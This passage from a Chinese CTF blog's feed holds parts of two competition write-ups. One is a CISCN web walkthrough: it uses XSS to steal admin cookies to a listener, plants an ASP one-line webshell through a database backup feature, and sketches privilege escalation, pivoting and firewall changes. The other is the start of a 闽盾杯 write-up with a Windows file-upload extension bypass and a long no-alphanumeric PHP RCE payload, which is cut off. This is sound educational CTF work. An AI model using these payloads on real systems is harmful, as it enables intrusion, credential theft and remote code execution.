src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/642" alt="图片"></p><p>在留言本上提交一段js脚本读取cookies并创建一个&lt;img标签（也可以用&lt;script标签），用其src属性来指向接收平台的URL，并把cookies内容拼接到URL的参数中。管理员浏览留言的时候就会执行代码，把cookies提交给接收平台。（写js比较666的话，你也可以调用XMLHttpRequest对象把cookies发出来）</p><p>nc会收到如下HTTP请求数据，带cookies内容：</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/643" alt="图片"></p><p>由于留言中的代码用了escape(document.cookie)，所以收到的内容要进行URLDecode解码才能把特殊字符还原。</p><h3 id="思路二：直接把cookies发表成新的留言"><a href="#思路二：直接把cookies发表成新的留言" class="headerlink" title="思路二：直接把cookies发表成新的留言"></a><strong>思路二：直接把cookies发表成新的留言</strong></h3><p>由于留言本内容是公开的，可以写脚本获取cookies并模拟填写表单，直接提交成一条新的留言。脚本示例如图：</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/644" alt="图片"></p><p>提交留言，等一会查看最新留言就能看到管理员发表出来的cookies数据了。</p><h3 id="跨站脚本XSS访问后台实现getshell"><a href="#跨站脚本XSS访问后台实现getshell" class="headerlink" title="跨站脚本XSS访问后台实现getshell"></a>跨站脚本XSS访问后台实现getshell</h3><p>前面发现&#x2F;admin&#x2F;只允许localhost访问。其实用XSS就可以实现以管理员的会话在本地访问后台页面。</p><p>留言提交一段JS代码，调用XMLHttpRequest对象以ajax方式访问后台路径&#x2F;admin&#x2F;，并把后台页面响应的HTML发送出来（跟接收cookie一样的思路）。</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/645" alt="图片"></p><p>nc收到后台网页源代码：（中文乱码并不影响分析）<br><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/646" alt="图片"></p><p>可以观察到后台页面主要是备份数据库文件的功能。（此处得到了数据库文件路径..&#x2F;ly.mdb，可以拼接成URL下载，打开获取flag）</p><p>进一步利用：</p><p>留言标题写上一句话木马&lt;%eval request(“a”)%&gt;，留言内容写脚本调用XMLHttpRequest对象以ajax方式模拟提交后台备份数据库的表单操作，把ly.mdb备份成一个*.asp或*.aspx的文件，就得到webshell了。脚本示例如图：</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/647" alt="图片"></p><p>提交留言，等一会就可以用中国菜刀或cknife之类的客户端连接一句话木马了。如图：</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/648" alt="图片"></p><p>在Web根目录还可以找到一个flag文件。</p><p><strong>后续渗透：</strong></p><p>可以上传提权工具，获取SYSTEM或administrator的权限，查看管理员桌面上的文件，发现有管理防火墙的笔记内容，得到防火墙管理后台登录权，修改防火墙策略实现内网区域的互通。</p><p>根据前面得到的权限和信息，可以进行跳板攻击，可以用Tunna或reDuh或meterpreter等工具搭建代理，把防火墙的web管理界面代理出来访问，尝试登录防火墙后台管理。</p><p><strong>防火墙作用一：</strong>修改防火墙过滤规则使不同网络区域之间互通，可以使内网系统被访问。</p><p><strong>防火墙作用二：</strong>防火墙可以用“目的地址转换”功能实现把内网IP、端口映射到其它网络区域。</p><hr><h1 id="ezwp"><a href="#ezwp" class="headerlink" title="ezwp"></a>ezwp</h1><h2 id="BREAK（非预期）"><a href="#BREAK（非预期）" class="headerlink" title="BREAK（非预期）"></a>BREAK（非预期）</h2><p>webpwn题</p><p>给了个myphp.so和index.php以及dockerfile</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-z,A-Z,0-9&lt;>\?]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>环境变量没删，flag就在phpinfo里</p><hr><h1 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h1><p>整个比赛过程都挺抽象的</p><p>在35度的篮球场里打8小时，人和电脑都得红温。好热…热得我要被晒干（？）了…就算没动也好热啊~</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/20240624205821.jpg" alt="20240624205821"></p><p>你在办一种很新的awdp，早上打四小时的break，下午再打四小时的fix，那早上不就等同于在打ctf？</p><p>开场的第一首歌：正在播放——春日影.mp3</p><p><img src="/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240626171208678.png" alt="image-20240626171208678"></p><p>开局pwn和web的题目上反了一道，还以为web什么时候也用二进制文件跑了</p><p>不过居然真的有webpwn，当然fix不能用web的方法fix，虽然我也不明白为什么要对一个ctf题搞fix。。。</p><p>华东南web的题目难度跟初赛比真的低太多了，还好没java，不然真得寄</p><p>然后是一些需要注意的事：</p><ul><li>本地 vscode 的commit ID会经常改变，于是建议在开赛当天还能联网的时候先下载好对应的ssh连接包</li><li>开发和安全缺一不可，别attack嘎嘎做然后waf写不动（</li></ul><p>接下来就是思考怎么准备决赛了，先立几个要完成的目标：</p><ul><li>CTF部分：因为到现在hw面试连个着落都没有，所以试图一个月内跟着<a href="https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file">Drun1baby师傅的java学习路线</a>搞定java（x；然后是复现之前比赛屯下的题目，那些比赛的题，很难，但得会；还有少刷点视频，多看看知识星球</li><li>渗透：有巨魔在，渗透压力会小一点，但是我自己也得去学一下内网代理，打打春秋云境和vulhub，然后准备自己的漏洞库，这个估计得多看看狗佬的博客了</li><li>AWD：吸取大b哥的经验，提前造轮子打批量，不然到时候有咱急的；然后就是记得把jar和war包打包明白（</li><li>Build：？</li><li>期末考：别挂，别挂，别挂，再挂下去会似</li><li>整点阳间的作息吧哥，放假了就别熬夜了，还是享受当下重要！</li><li>别成天惦记凹你那总力战&#x2F;深渊&#x2F;肉鸽了，还有很多事没做，有这时间都能推几个ap了，steam上还有一堆galgame没推呢（（</li></ul><p><del>什么，我一个月搞定这些，真的假的？</del></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;⚠热异常⚠&lt;/p&gt;
&lt;p&gt;办的很好，下次别在fjnu办了，切割了（（&lt;/p&gt;
&lt;p&gt;&lt;del&gt;现在是6月23号早上的8点36，星期天；24号，高等数学，（差）一章没看，27号，概率论，还行，还剩题没做…欸这茶歇东西还挺多ww&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;是web的wp&lt;/p&gt;
&lt;p&gt;由我和@Laffey共同完成，个人对web的评价是纯拼积累，线下断网情况下有一个自己的本地博客太重要了，然后就是老赛棍魅力时刻（&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/blog/2024/06/23/CISCN%E7%AC%AC%E5%8D%81%E4%B8%83%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-%E5%88%9B%E6%96%B0%E5%AE%9E%E8%B7%B5%E8%83%BD%E5%8A%9B%E8%B5%9B-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA/image-20240623165857174.png&quot; alt=&quot;image-20240623165857174&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="AWDP" scheme="http://c1oudfl0w0.github.io/blog/categories/AWDP/"/>
    
    
  </entry>
  
  <entry>
    <title>2024闽盾杯-黑盾赛道CTF初赛-本科组</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/</id>
    <published>2024-06-22T01:33:04.000Z</published>
    <updated>2024-07-09T16:39:12.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>鉴定为找flag大赛</p><p>第二年了还是进不去线下，只靠自己真是一点也打不穿啊。。</p><p>官方wp：<a href="https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf">https://heidunbei.si.net.cn/uploads/heiduncup/4c09bd8c1e4fb15d554413327e98513f.pdf</a></p><p>合着全是543出的是吧</p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="No-characters"><a href="#No-characters" class="headerlink" title="No characters"></a>No characters</h2><blockquote><p>windows文件上传 + 无字母数字rce</p></blockquote><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">告诉你我是windows又怎么样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>是一个文件上传的功能</p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622102314801.png" alt="image-20240622102314801"></p><p>测试发现过滤了一些后缀名，包括php</p><p>因为是windows环境，所以这里需要利用windows的特性来上传文件</p><p>参考：<a href="https://blog.csdn.net/m0_68976043/article/details/136695554">https://blog.csdn.net/m0_68976043/article/details/136695554</a></p><p>这样传php的问题就解决了</p><p>先传入一个文件名为<code>1.php:jpg</code></p><p>然后再传入第二个文件名为<code>1.&lt;&lt;&lt;</code>，此时就相当于写入了php文件</p><p>然后测试发现文件内容不能有字母和数字，即无字母数字rce</p><p>参考：<a href="https://www.cnblogs.com/poing/p/12831304.html">https://www.cnblogs.com/poing/p/12831304.html</a></p><p>写入自增构造的payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'!'</span><span class="token operator">==</span><span class="token string single-quoted-string">'@'</span><span class="token punctuation">]</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$___</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter 